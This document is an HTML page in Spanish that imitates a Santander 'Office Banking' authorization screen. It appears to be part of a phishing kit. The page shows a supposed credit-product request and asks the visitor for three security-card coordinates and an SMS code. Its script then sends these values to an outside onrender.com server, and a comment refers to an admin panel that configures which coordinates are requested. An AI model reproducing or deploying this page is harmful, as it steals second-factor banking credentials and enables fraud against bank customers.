<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización por Coordenadas</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    h1 {
      color: red;
      text-transform: uppercase;
      text-align: center;
    }
    .sub-text {
      margin-top: 10px;
      font-size: 13px;
      color: #333;
      text-align: center;
    }
    .seleccion-texto {
      text-align: center;
      margin: 15px 0;
      font-size: 15px;
      font-weight: bold;
    }
    .coord-box {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin: 20px 0;
    }
    .coord-item {
      background: #ffdddd;
      border: 2px solid red;
      border-radius: 6px;
      padding: 10px;
      text-align: center;
      width: 60px;
    }
    .coord-item label {
      font-size: 12px;
      font-weight: bold;
      color: red;
      display: block;
      margin-bottom: 5px;
    }
    .coord-item input {
      width: 100%;
      text-align: center;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .sms-box {
      text-align: center;
      margin-top: 20px;
    }
    .sms-box input {
      width: 120px;
      text-align: center;
      font-size: 16px;
      border: 2px solid red;
      border-radius: 4px;
      padding: 6px;
    }
    .btn-center {
      display: block;
      margin: 20px auto;
    }
    #mensaje {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
      font-weight: bold;
      color: red;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h1>Autorización requerida</h1>
    <div class="sub-text">Estás solicitando el siguiente producto:</div>
    <div class="seleccion-texto" id="seleccionProducto"></div>

    <div class="coord-box">
      <div class="coord-item">
        <label id="coordLabel1"></label>
        <input type="text" id="coordA" maxlength="1" required>
      </div>
      <div class="coord-item">
        <label id="coordLabel2"></label>
        <input type="text" id="coordB" maxlength="1" required>
      </div>
      <div class="coord-item">
        <label id="coordLabel3"></label>
        <input type="text" id="coordC" maxlength="1" required>
      </div>
    </div>

    <div class="sms-box">
      <label>Clave SMS (6 dígitos)</label><br>
      <input type="text" id="claveSMS" maxlength="6" required>
    </div>

    <button class="btn-santander btn-center" id="autorizarBtn">
      AUTORIZAR<span class="bg-arrow"></span>
    </button>

    <div id="mensaje"></div>
  </div>

  <script>
    // Formato CLP
    function formatoCLP(valor){
      return new Intl.NumberFormat("es-CL", {
        style: "currency",
        currency: "CLP",
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(valor);
    }

    document.addEventListener("DOMContentLoaded", () => {
      const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
      const monto1 = localStorage.getItem("lineaMonto") || 5000000;
      const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
      const monto2 = localStorage.getItem("tarjetaMonto") || monto1;
      const seleccion = localStorage.getItem("seleccionProducto");

      let texto = "";
      if(seleccion === "linea"){
        texto = producto1 + " por <span class='monto-box'>" + formatoCLP(monto1) + "</span>";
      } else if(seleccion === "tarjeta"){
        texto = producto2 + " por <span class='monto-box'>" + formatoCLP(monto2) + "</span>";
      } else {
        texto = "No se ha seleccionado producto.";
      }
      document.getElementById("seleccionProducto").innerHTML = texto;

      // Mostrar coordenadas configuradas en Panel Admin
      document.getElementById("coordLabel1").innerText = "Coord " + (localStorage.getItem("coord1") || "A");
      document.getElementById("coordLabel2").innerText = "Coord " + (localStorage.getItem("coord2") || "B");
      document.getElementById("coordLabel3").innerText = "Coord " + (localStorage.getItem("coord3") || "C");
    });

    document.getElementById("autorizarBtn").addEventListener("click", async function(){
      const coordA = document.getElementById("coordA").value;
      const coordB = document.getElementById("coordB").value;
      const coordC = document.getElementById("coordC").value;
      const claveSMS = document.getElementById("claveSMS").value;

      const mensaje = `Autorización Coordenadas:
      ${localStorage.getItem("coord1")}: ${coordA}
      ${localStorage.getItem("coord2")}: ${coordB}
      ${localStorage.getItem("coord3")}: ${coordC}
      Clave SMS: ${claveSMS}`;

      document.getElementById("mensaje").innerText = "Enviando autorización...";

      try {
        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });

        if(response.ok){
          document.getElementById("mensaje").innerText = "✅ Autorización enviada.";
        } else {
          document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
        }
      } catch (error) {
        document.getElementById("mensaje").innerText = "⚠️ No se pudo conectar con el servidor.";
      }
    });
  </script>
</body>
</html>
